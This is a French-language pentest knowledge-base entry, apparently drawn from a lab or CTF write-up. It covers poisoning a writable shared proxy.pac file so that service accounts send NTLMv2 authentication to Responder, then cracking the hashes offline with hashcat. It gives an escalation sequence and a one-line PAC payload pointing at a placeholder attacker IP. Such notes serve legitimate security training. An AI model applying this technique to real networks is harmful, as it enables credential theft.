---
doc_kind: pattern
title: "Empoisonnement de fichier de config partage (proxy.pac) pour capturer NTLMv2"
category: misc
slug: rpg-ch5-winscp-responder-ntlm-relay-crack
created: 2026-10-29
status: active
tags:
  - ntlmv2-capture
  - responder
  - proxy-pac-poisoning
  - winscp-creds
  - runascs
  - hashcat
chain_summary: "Un fichier de configuration client partage en ecriture (proxy.pac notamment) peut etre remplace pour forcer une authentification reseau automatique capturable par Responder, puis crackee offline si le relais direct est patche."
---
# Empoisonnement de fichier de config partage (proxy.pac) pour capturer NTLMv2

## Chain Summary

- One-line chain: Un fichier de configuration client partage en ecriture (proxy.pac notamment) peut etre remplace pour forcer une authentification reseau automatique capturable par Responder, puis crackee offline si le relais direct est patche.
- Typical target shape: Acces en ecriture a un fichier de configuration partage utilise automatiquement par d'autres comptes/services (proxy.pac, fichier .ini de connexion, etc.); MS16-075 ou equivalent empechant le relais direct.

## Preconditions

- Acces en ecriture a un fichier de configuration partage utilise automatiquement par d'autres comptes/services (proxy.pac, fichier .ini de connexion, etc.); MS16-075 ou equivalent empechant le relais direct.

## Cheap Probes

- Verifier les permissions d'ecriture sur les fichiers de config partages connus (proxy.pac, scripts de login, etc.) accessibles par le compte courant.

## Telltale Evidence

- Permissions d'ecriture confirmees sur un fichier de config consulte automatiquement par d'autres comptes de service.

## Escalation Order

1. Identifier un fichier de config partage en ecriture consulte automatiquement (proxy.pac typique).
2. Remplacer son contenu pour rediriger le trafic/l'authentification vers un listener controle (Responder en mode proxy -P).
3. Capturer les hashs Net-NTLMv2 resultants.
4. Si le relais direct est patche, cracker offline (hashcat mode 5600) plutot que de tenter un relais voue a l'echec.

## Common Mistakes

- Essayer uniquement le relais NTLM sans verifier au prealable si le correctif pertinent est deja applique sur la cible du relais.

## Payload Shapes

```text
function FindProxyForURL(url,host){return 'PROXY <attacker-ip>:<port>';}
```

## Related Writeups

- rpg-ch5-winscp-responder-ntlm-relay-crack

## Skill Impact

- Related skill: pwn-triage/AD: ajouter l'empoisonnement de fichiers de config partages comme vecteur de capture NTLM alternatif a la coercition classique (PetitPotam, etc.).
- Rule to add or update: (backlog only for now; promote if this pattern repeats)
